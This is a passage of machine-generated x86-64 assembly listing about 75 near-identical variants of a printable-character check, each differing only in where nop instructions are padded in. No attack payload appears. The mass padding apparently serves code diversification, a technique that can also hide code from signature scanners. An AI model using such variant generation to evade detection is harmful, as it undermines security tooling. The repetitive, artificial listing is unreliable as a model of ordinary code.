	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 70
.Lmain_win0_var70:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 71
.Lmain_win0_var71:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	nop
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 72
.Lmain_win0_var72:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	nop
	nop
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 73
.Lmain_win0_var73:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 74
.Lmain_win0_var74:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win0_continue
## Variant 75
.Lmain_win0_var75:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 76
.Lmain_win0_var76:
	popq	%rax
	cmpl	$31, %eax
	nop
	jle	LBB2_18
	nop
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 77
.Lmain_win0_var77:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	nop
	jge	LBB2_18
	nop
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 78
.Lmain_win0_var78:
	popq	%rax
	cmpl	$31, %eax
	nop
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 79
.Lmain_win0_var79:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
	nop
	nop
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 80
.Lmain_win0_var80:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
	nop
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 81
.Lmain_win0_var81:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	nop
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 82
.Lmain_win0_var82:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
	nop
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 83
.Lmain_win0_var83:
	popq	%rax
	nop
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
	nop
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win0_continue
## Variant 84
.Lmain_win0_var84:
	popq	%rax
	nop
	nop
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 85
.Lmain_win0_var85:
	popq	%rax
	cmpl	$31, %eax
	nop
	jle	LBB2_18
	nop
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 86
.Lmain_win0_var86:
	popq	%rax
	nop
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win0_continue
## Variant 87
.Lmain_win0_var87:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win0_continue
## Variant 88
.Lmain_win0_var88:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 89
.Lmain_win0_var89:
	popq	%rax
	cmpl	$31, %eax
	nop
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 90
.Lmain_win0_var90:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
	nop
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	nop
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 91
.Lmain_win0_var91:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
	nop
	nop
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 92
.Lmain_win0_var92:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	nop
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 93
.Lmain_win0_var93:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	nop
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 94
.Lmain_win0_var94:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
	nop
	nop
	nop
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 95
.Lmain_win0_var95:
	popq	%rax
	cmpl	$31, %eax
	nop
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
	nop
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 96
.Lmain_win0_var96:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	nop
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 97
.Lmain_win0_var97:
	popq	%rax
	cmpl	$31, %eax
	nop
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 98
.Lmain_win0_var98:
	popq	%rax
	nop
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 99
.Lmain_win0_var99:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
	nop
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	nop
	jmp	.Lmain_win0_continue
## Variant 100
.Lmain_win0_var100:
	popq	%rax
	nop
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
	nop
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 101
.Lmain_win0_var101:
	popq	%rax
	nop
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 102
.Lmain_win0_var102:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
	nop
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	nop
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 103
.Lmain_win0_var103:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 104
.Lmain_win0_var104:
	popq	%rax
	nop
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win0_continue
## Variant 105
.Lmain_win0_var105:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win0_continue
## Variant 106
.Lmain_win0_var106:
	popq	%rax
	cmpl	$31, %eax
	nop
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	nop
	nop
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 107
.Lmain_win0_var107:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
	nop
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 108
.Lmain_win0_var108:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	nop
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 109
.Lmain_win0_var109:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
	nop
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 110
.Lmain_win0_var110:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	nop
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 111
.Lmain_win0_var111:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 112
.Lmain_win0_var112:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	cmpl	$127, %eax
	jge	LBB2_18
	nop
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 113
.Lmain_win0_var113:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 114
.Lmain_win0_var114:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win0_continue
## Variant 115
.Lmain_win0_var115:
	popq	%rax
	nop
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 116
.Lmain_win0_var116:
	popq	%rax
	cmpl	$31, %eax
	nop
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win0_continue
## Variant 117
.Lmain_win0_var117:
	popq	%rax
	cmpl	$31, %eax
	nop
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 118
.Lmain_win0_var118:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	nop
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 119
.Lmain_win0_var119:
	popq	%rax
	cmpl	$31, %eax
	nop
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 120
.Lmain_win0_var120:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
	nop
	nop
	nop
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 121
.Lmain_win0_var121:
	popq	%rax
	cmpl	$31, %eax
	nop
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	nop
	jmp	.Lmain_win0_continue
## Variant 122
.Lmain_win0_var122:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 123
.Lmain_win0_var123:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 124
.Lmain_win0_var124:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
	nop
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 125
.Lmain_win0_var125:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	cmpl	$127, %eax
	nop
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 126
.Lmain_win0_var126:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
	nop
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
	nop
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 127
.Lmain_win0_var127:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 128
.Lmain_win0_var128:
	popq	%rax
	nop
	nop
	nop
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 129
.Lmain_win0_var129:
	popq	%rax
	nop
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 130
.Lmain_win0_var130:
	popq	%rax
	nop
	cmpl	$31, %eax
	jle	LBB2_18
	nop
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	jmp	.Lmain_win0_continue
## Variant 131
.Lmain_win0_var131:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 132
.Lmain_win0_var132:
	popq	%rax
	cmpl	$31, %eax
	nop
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	nop
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 133
.Lmain_win0_var133:
	popq	%rax
	nop
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	nop
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 134
.Lmain_win0_var134:
	popq	%rax
	cmpl	$31, %eax
	nop
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
	nop
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 135
.Lmain_win0_var135:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 136
.Lmain_win0_var136:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 137
.Lmain_win0_var137:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	nop
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	nop
	nop
	jmp	.Lmain_win0_continue
## Variant 138
.Lmain_win0_var138:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	nop
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	nop
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 139
.Lmain_win0_var139:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
	nop
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 140
.Lmain_win0_var140:
	popq	%rax
	nop
	cmpl	$31, %eax
	nop
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 141
.Lmain_win0_var141:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
	nop
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
	nop
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 142
.Lmain_win0_var142:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 143
.Lmain_win0_var143:
	popq	%rax
	cmpl	$31, %eax
	nop
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
## %bb.17:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	jmp	.Lmain_win0_continue
## Variant 144
.Lmain_win0_var144:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_18
## %bb.16:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-53(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_18
